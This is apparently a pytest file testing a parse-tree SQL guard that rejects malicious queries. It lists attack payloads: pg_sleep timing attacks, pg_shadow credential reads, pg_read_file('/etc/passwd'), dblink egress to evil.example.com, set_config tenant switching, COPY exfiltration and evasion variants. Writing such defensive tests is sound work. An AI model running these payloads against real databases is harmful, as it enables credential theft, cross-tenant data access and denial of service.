"""Adversarial tests for SqlRunner's safety boundary.

Before this file, SqlRunner had ZERO tests against a malicious payload. Its
only safety test (`test_custom_sql_rule_safety.py`) proves that quality rules
are ROUTED through SqlRunner; it takes SqlRunner's own boundary on faith and
only ever sends it `DROP TABLE`, which the old keyword blocklist did catch.

The payloads are in two lists. `BYPASS_PAYLOADS` are the ones the old blocklist
did NOT catch, which is where the improvement lives; `ALSO_REJECTED` holds two
the old check did catch, kept for coverage but excluded from the improvement
claim. That the split is honest is itself asserted —
`test_old_blocklist_missed_every_payload` re-implements the old `_check_safety`
verbatim and fails if anything in the bypass list was never a bypass. It caught
two mislabelled payloads when this file was written, which is why the second
list exists. Same standard as Item #4's
before/after proof, with one difference worth noting: Item #4 checked out the
pre-fix commit and ran against it, which is stronger. That is not possible here
because the payloads and the fix arrive in the same commit, so the old function
is reproduced in the test instead. It is copied from git, not paraphrased.

The tests call the validator directly rather than executing SQL. That is the
point of the boundary: a payload that reaches a database connection has already
defeated it, so proving rejection means proving it never gets that far.
"""

import re

import pytest

from modules.transformation import sql_guard
from modules.transformation.sql_runner import SqlRunner


# ── The old implementation, reproduced verbatim for the before/after proof ────

# Copied unchanged from sql_runner.py as it stood at commit b51927d, so that
# "the old check allowed this" is demonstrated rather than asserted. Do not
# "fix" or tidy this — its bugs are the entire point.
_OLD_BLOCKED_KEYWORDS = frozenset([
    "DROP", "TRUNCATE", "DELETE", "ALTER", "GRANT", "REVOKE",
    "CREATE", "INSERT", "UPDATE", "REPLACE", "EXEC", "EXECUTE",
    "CALL", "LOAD", "OUTFILE", "DUMPFILE",
])


def _old_check_safety(sql: str) -> dict:
    clean = sql.strip().upper()
    tokens = re.split(r"\W+", clean)

    for token in tokens:
        if token in _OLD_BLOCKED_KEYWORDS:
            return {"error": f"blocked keyword '{token}'"}

    first_token = tokens[0] if tokens else ""
    if first_token not in ("SELECT", "WITH", "EXPLAIN"):
        return {"error": f"must start with SELECT or WITH, got '{first_token}'"}

    return {"ok": True}


def _old_allows(sql: str) -> bool:
    return "ok" in _old_check_safety(sql)


# ── Payloads the old blocklist missed ────────────────────────────────────────

# (id, sql) — id doubles as the pytest test name, so a failure names the attack.
BYPASS_PAYLOADS = [
    # Timing abuse. pg_sleep is not a keyword, so no tokeniser was ever going
    # to see it. Thirty of these in sequence is a denial of service against
    # the connection pool that never touches a row.
    ("pg_sleep_bare", "SELECT pg_sleep(30)"),
    ("pg_sleep_embedded", "SELECT id, pg_sleep(10) FROM orders"),
    ("pg_sleep_in_where", "SELECT * FROM orders WHERE pg_sleep(5) IS NULL"),
    # The old check explicitly PERMITTED a leading EXPLAIN. ANALYZE makes the
    # planner actually execute the query it claims to be explaining, so this
    # is a full cartesian product wearing a dry-run costume.
    ("explain_analyze", "EXPLAIN ANALYZE SELECT count(*) FROM orders o1, orders o2"),
    ("explain_analyze_parenthesised", "EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM orders"),
    # Statement chaining. asyncpg happens to refuse these on the postgres path
    # ("cannot insert multiple commands into a prepared statement") but that is
    # the wire protocol's doing, not the safety layer's, and it does not cover
    # the MySQL path.
    ("chained_statements", "SELECT 1; SELECT pg_sleep(5)"),
    ("chained_unblocked_write", "SELECT 1; COPY orders TO '/tmp/exfil.csv'"),
    # Classic injection shape: terminate the intended statement, append your
    # own, and comment out whatever followed so the result still parses.
    ("comment_injection_breakout",
     "SELECT * FROM orders WHERE id = 1;"
     " SELECT table_name FROM information_schema.tables -- ' AND tenant_id = 'x'"),
    # DDL with no blocked keyword anywhere in it. SELECT ... INTO creates a
    # table in postgres. The old blocklist had CREATE in it and this still
    # walked straight through.
    ("select_into_creates_table", "SELECT * INTO evil_table FROM orders"),
    # Catalog reads. RLS does not protect the catalog — it is not a
    # tenant-owned table — so this enumerates every tenant's schema at once.
    ("information_schema", "SELECT table_name FROM information_schema.tables"),
    ("pg_catalog_qualified", "SELECT * FROM pg_catalog.pg_tables"),
    ("pg_catalog_unqualified", "SELECT * FROM pg_stat_activity"),
    ("pg_shadow_credentials", "SELECT usename, passwd FROM pg_shadow"),
    # Repointing the RLS tenant context from inside a "read-only" query. This
    # is the setting every Item #2 policy reads.
    ("set_config_breaks_rls",
     "SELECT set_config('app.current_tenant_id', 'other-tenant', false)"),
    # Server-side file I/O and outbound network egress.
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')"),
    ("lo_export", "SELECT lo_export(1, '/tmp/owned')"),
    ("dblink_egress", "SELECT dblink('host=evil.example.com', 'SELECT 1')"),
    # Resource exhaustion by multiplication rather than by sleeping.
    ("cross_join_explicit", "SELECT * FROM orders a CROSS JOIN orders b CROSS JOIN orders c"),
    ("cross_join_comma", "SELECT * FROM orders a, orders b, orders c"),
    # Non-postgres spellings of the same timing attack, for the MySQL path.
    ("mysql_sleep", "SELECT sleep(30)"),
    ("mysql_benchmark", "SELECT benchmark(10000000, md5('x'))"),
    ("mysql_load_file", "SELECT load_file('/etc/passwd')"),
]


# Attacks the OLD blocklist also caught, kept separately and deliberately.
# Both contain a blocked keyword, so they are not evidence that the parser is
# an improvement — but they are two of the shapes most likely to be attempted,
# and dropping them because the old code happened to handle them would leave
# the new code untested against them. Keeping the lists apart is what lets
# test_old_blocklist_missed_every_payload make an honest claim.
ALSO_REJECTED = [
    ("chained_after_comment", "SELECT 1 -- harmless\n; DROP TABLE orders"),
    # A write hidden where only a parser can find it: the root really is a
    # SELECT, so any check that inspects only the FIRST token is satisfied.
    # The old check caught this one incidentally, on the bare `INSERT` token —
    # it never understood that a CTE could contain a write, which is why
    # `SELECT ... INTO` (above) walked straight through it.
    ("write_hidden_in_cte",
     "WITH x AS (INSERT INTO audit_log VALUES ('owned') RETURNING *) SELECT * FROM x"),
]

ALL_REJECTED = BYPASS_PAYLOADS + ALSO_REJECTED


@pytest.mark.parametrize("payload", [p[1] for p in ALL_REJECTED],
                         ids=[p[0] for p in ALL_REJECTED])
def test_guard_rejects_malicious_payload(payload):
    """Every payload is rejected by the parse-tree guard."""
    result = sql_guard.validate(payload)
    assert not result.ok, f"guard ALLOWED a malicious payload: {payload!r}"


def test_old_blocklist_missed_every_payload():
    """The before/after proof.

    Asserts the old keyword blocklist allowed all of these. If a future change
    to BYPASS_PAYLOADS adds something the old check would have caught, this
    fails and says so — the list is meant to document the improvement, so a
    payload that was never a bypass does not belong in it.
    """
    caught_by_old = [name for name, sql in BYPASS_PAYLOADS if not _old_allows(sql)]
    assert caught_by_old == [], (
        "these are not bypasses — the old blocklist already caught them: "
        f"{caught_by_old}"
    )


def test_runner_surfaces_rejections_through_check_safety():
    """The guard is actually wired into SqlRunner, not merely present.

    Called unbound: _check_safety touches no instance state, and constructing
    a SqlRunner would drag in the tenant_scoped decorator for no reason.
    """
    for _name, sql in ALL_REJECTED:
        result = SqlRunner._check_safety(None, sql)
        assert "error" in result, f"SqlRunner allowed: {sql!r}"


# ── Rejections must not leak how the check works ──────────────────────────────

def test_rejection_messages_do_not_leak_internals():
    """A rejection says which rule was broken and nothing more.

    The old message was `blocked keyword 'DROP' detected`, which hands an
    attacker the blocklist one probe at a time. These messages go back over the
    API as a 400 detail and into the LLM's context, so they must not name the
    offending token, the function, the table, or the parser.
    """
    forbidden_substrings = [
        "sqlglot", "Traceback", "exp.", "parse", "Token", "blocklist",
        "pg_sleep", "information_schema", "set_config", "dblink",
        "evil_table", "/etc/passwd", "audit_log", "orders",
    ]
    for _name, sql in ALL_REJECTED:
        message = sql_guard.validate(sql).error
        assert message.startswith("SQL rejected: "), message
        lowered = message.lower()
        for leak in forbidden_substrings:
            assert leak.lower() not in lowered, (
                f"rejection message leaked {leak!r}: {message!r}"
            )


def test_unparseable_sql_is_rejected_without_exposing_the_parser():
    result = sql_guard.validate("this is not sql at all !!!")
    assert not result.ok
    assert result.error == "SQL rejected: the query could not be parsed as valid SQL."


def test_empty_sql_is_rejected():
    assert not sql_guard.validate("").ok
    assert not sql_guard.validate("   \n  ").ok


# ── Legitimate SQL must still pass ───────────────────────────────────────────

# Real shapes, not invented ones: the first is exactly what
# transform_generator's own system prompt instructs the model to emit ("Use
# CTEs", "Include a LIMIT clause", "Add inline SQL comments", "starting with --
# or WITH or SELECT"), the rest are the query shapes the existing test suite
# and connectors already run.
LEGITIMATE_SQL = [
    ("llm_generated_shape", """-- Step 1: aggregate revenue per customer
WITH per_customer AS (
    SELECT c.id AS customer_id, SUM(o.revenue_usd) AS revenue
    FROM orders o
    JOIN customers c ON c.id = o.customer_id
    WHERE o.status = 'complete'
    GROUP BY c.id
)
-- Step 2: return the top spenders
SELECT pc.customer_id, pc.revenue
FROM per_customer pc
ORDER BY pc.revenue DESC
LIMIT 10000;"""),
    ("plain_select", "SELECT * FROM widgets"),
    ("select_with_limit", "SELECT revenue_usd FROM main LIMIT 10"),
    ("count_star", "SELECT COUNT(*) AS count FROM orders"),
    ("aggregate_group_by",
     "SELECT region, AVG(amount) FROM sales GROUP BY region HAVING AVG(amount) > 100"),
    ("inner_join", "SELECT a.id, b.name FROM a JOIN b ON a.id = b.a_id"),
    ("left_join_with_using", "SELECT * FROM a LEFT JOIN b USING (id)"),
    ("union", "SELECT id FROM a UNION SELECT id FROM b"),
    ("subquery_in_where",
     "SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE active)"),
    ("case_expression",
     "SELECT CASE WHEN amount > 100 THEN 'high' ELSE 'low' END AS tier FROM sales"),
    ("window_function",
     "SELECT id, ROW_NUMBER() OVER (PARTITION BY region ORDER BY amount DESC) FROM sales"),
    ("date_functions",
     "SELECT DATE_TRUNC('month', created_at) AS m, COUNT(*) FROM events GROUP BY 1"),
    ("coalesce_and_cast", "SELECT COALESCE(name, 'unknown')::text FROM users"),
    ("lateral_table_function", "SELECT o.id, t FROM orders o, unnest(o.tags) AS t"),
    ("mysql_backtick_identifiers", "SELECT `id`, `name` FROM `widgets` LIMIT 100"),
]


@pytest.mark.parametrize("sql", [s[1] for s in LEGITIMATE_SQL],
                         ids=[s[0] for s in LEGITIMATE_SQL])
def test_legitimate_sql_still_passes(sql):
    result = sql_guard.validate(sql)
    assert result.ok, f"guard rejected legitimate SQL: {result.error}\n{sql}"


def test_old_check_rejected_axioms_own_generated_sql():
    """A functional bug the parser fixes as a side effect.

    transform_generator's system prompt tells the model its output should start
    with `--`. The old check uppercased and split on \\W+, which turns a leading
    comment into an empty first token, so the query failed the
    "must start with SELECT or WITH" test. AXIOM's own generated SQL, in the
    exact format AXIOM asked for, was rejected by AXIOM's own safety check.
    """
    llm_sql = dict(LEGITIMATE_SQL)["llm_generated_shape"]
    assert not _old_allows(llm_sql), "expected the old check to reject this"
    assert sql_guard.validate(llm_sql).ok


def test_old_check_rejected_string_literals_matching_keywords():
    """The other direction of the same tokeniser bug: a parser distinguishes a
    keyword from a string literal, a tokeniser cannot."""
    for sql in [
        "SELECT * FROM audit WHERE action = 'delete'",
        "SELECT COUNT(*) FROM events WHERE type = 'INSERT'",
    ]:
        assert not _old_allows(sql), f"expected the old check to reject {sql!r}"
        assert sql_guard.validate(sql).ok, f"guard should allow {sql!r}"


# ── Evasion attempts against the NEW guard ───────────────────────────────────

EVASIONS = [
    # Case, quoting and schema qualification must not change the verdict —
    # these are the first things tried against any name-based rule.
    ("uppercase_function", "SELECT PG_SLEEP(30)"),
    ("quoted_function", 'SELECT "pg_sleep"(30)'),
    ("schema_qualified_function", "SELECT pg_catalog.pg_sleep(30)"),
    ("function_as_table", "SELECT * FROM pg_sleep(30)"),
    ("function_cast", "SELECT pg_sleep(30)::text"),
    ("uppercase_schema", "SELECT * FROM INFORMATION_SCHEMA.TABLES"),
    ("quoted_schema", 'SELECT * FROM "information_schema"."tables"'),
    ("mixed_case_schema", "SELECT * FROM Pg_Catalog.pg_tables"),
    # The checks walk the whole tree, so burying the payload does not help.
    ("nested_in_scalar_subquery", "SELECT (SELECT pg_sleep(5))"),
    ("nested_in_cte", "WITH x AS (SELECT pg_sleep(5)) SELECT * FROM x"),
    ("nested_in_derived_table",
     "SELECT * FROM (SELECT * FROM information_schema.tables) z"),
    ("nested_in_exists", "SELECT * FROM t WHERE EXISTS (SELECT 1 FROM pg_shadow)"),
    ("nested_in_union",
     "SELECT a FROM t UNION SELECT table_name FROM information_schema.tables"),
    # A cartesian product spelled as a join with a predicate that constrains
    # nothing — the obvious next move once bare CROSS JOIN is refused.
    ("tautological_on_true", "SELECT * FROM orders a JOIN orders b ON true"),
    ("tautological_on_1_eq_1", "SELECT * FROM orders a JOIN orders b ON 1=1"),
    ("tautological_on_string", "SELECT * FROM a JOIN b ON 'x'='x'"),
]


@pytest.mark.parametrize("sql", [e[1] for e in EVASIONS], ids=[e[0] for e in EVASIONS])
def test_guard_rejects_evasion_attempt(sql):
    assert not sql_guard.validate(sql).ok, f"evasion succeeded: {sql!r}"


def test_table_functions_are_not_treated_as_cartesian_joins():
    """The cartesian check must not fire on a table function.

    sqlglot wraps `generate_series(1, 10)` and a plain `orders` in the same
    exp.Table node, so a naive check rejects both. These are ordinary
    transformation shapes and rejecting them would break real work.
    """
    for sql in [
        "SELECT * FROM generate_series(1,10) g, generate_series(1,10) h",
        "SELECT * FROM orders o, unnest(o.tags) t",
    ]:
        assert sql_guard.validate(sql).ok, f"false positive on {sql!r}"


def test_tautology_detection_is_known_to_be_incomplete():
    """Documents the limit of the join check rather than overstating it.

    `ON a.x = a.x` constrains nothing either, but deciding that in general
    means evaluating predicates, which a parser cannot do. This asserts the
    CURRENT behaviour so that a future improvement shows up as this test
    failing, and so nobody reads the cartesian check as airtight. The real
    bound on an expensive-but-legal query is the injected root LIMIT and the
    statement timeout, not this check.
    """
    assert sql_guard.validate("SELECT * FROM a JOIN a a2 ON a.x = a2.x").ok


# ── Root-level LIMIT detection ───────────────────────────────────────────────

def test_subquery_limit_does_not_count_as_a_root_limit():
    """The old _inject_limit searched the text for \\bLIMIT\\b, so a bounded
    subquery inside an unbounded outer scan looked bounded and nothing was
    injected — an unbounded scan of the outer table, by design."""
    sql = "SELECT * FROM big WHERE id IN (SELECT id FROM small LIMIT 1)"

    assert re.search(r"\bLIMIT\b", sql, re.IGNORECASE), "precondition: old regex matched"
    assert sql_guard.validate(sql).has_root_limit is False

    injected = SqlRunner._inject_limit(None, sql, 10_000, False)
    assert injected.rstrip().endswith("LIMIT 10000;")


def test_root_limit_is_detected_and_not_doubled():
    sql = "SELECT * FROM t LIMIT 5"
    assert sql_guard.validate(sql).has_root_limit is True
    assert SqlRunner._inject_limit(None, sql, 10_000, True) == sql


def test_fetch_first_counts_as_a_root_limit():
    """Appending LIMIT to a query already using FETCH FIRST would be a syntax
    error, so FETCH has to count as bounding the root."""
    assert sql_guard.validate("SELECT * FROM t FETCH FIRST 5 ROWS ONLY").has_root_limit


def test_trailing_comment_after_semicolon_is_not_a_second_statement():
    """Found by an existing test failing, not by design.

    sqlglot yields a second parse tree for `SELECT 1; -- done`: an
    exp.Semicolon carrying the comment. Counting it made the guard reject a
    perfectly ordinary query, and transform_generator's prompt tells the model
    to write comments, so this was a live false positive, not a curiosity.
    """
    for sql in [
        "SELECT * FROM t LIMIT 5;\n-- done",
        "SELECT 1; --",
        "SELECT 1; /* note */",
        "SELECT 1;",
    ]:
        assert sql_guard.validate(sql).ok, f"false positive on {sql!r}"


def test_a_comment_cannot_smuggle_a_second_statement():
    """The other half of the fix above: skipping the comment-only node must not
    become a way to hide a real statement behind a comment."""
    for sql in [
        "SELECT 1; /* x */ DROP TABLE t",
        "SELECT 1; -- x\nDROP TABLE t",
        "SELECT 1; /* x */ SELECT pg_sleep(5)",
        "SELECT 1;--\n;SELECT 2",
    ]:
        assert not sql_guard.validate(sql).ok, f"comment smuggled a statement: {sql!r}"


def test_a_trailing_comment_alone_is_allowed_and_cannot_neutralise_the_limit():
    """The inert half of comment injection, kept explicit so the boundary is
    documented rather than assumed.

    `SELECT ... ; -- ' AND tenant_id = 'x'` is genuinely harmless HERE, and the
    guard allows it. The classic attack it imitates works by commenting out a
    predicate the application appends after the user's input — but SqlRunner
    appends nothing except a LIMIT, on its own line, so a line comment cannot
    reach it. An unterminated block comment, which could, fails to parse and is
    rejected instead. Both directions are asserted.
    """
    inert = "SELECT * FROM orders WHERE id = 1; -- ' AND tenant_id = 'victim'"
    assert sql_guard.validate(inert).ok

    line_comment = "SELECT * FROM big --"
    verdict = sql_guard.validate(line_comment)
    assert verdict.ok and verdict.has_root_limit is False
    injected = SqlRunner._inject_limit(None, line_comment, 10_000, False)
    assert sql_guard.validate(injected).has_root_limit is True, (
        "a trailing line comment swallowed the injected LIMIT"
    )

    for unterminated in ["SELECT * FROM big /*", "SELECT * FROM big /* x"]:
        assert not sql_guard.validate(unterminated).ok


def test_limit_injection_survives_a_trailing_comment():
    """transform_generator asks the model for inline comments, so a query
    ending in one is the normal case, not an edge case. Without the newline the
    injected LIMIT would be commented out and silently do nothing."""
    injected = SqlRunner._inject_limit(None, "SELECT * FROM t -- all rows", 10_000, False)
    assert injected.splitlines()[-1] == "LIMIT 10000;"
    assert sql_guard.validate(injected).has_root_limit is True
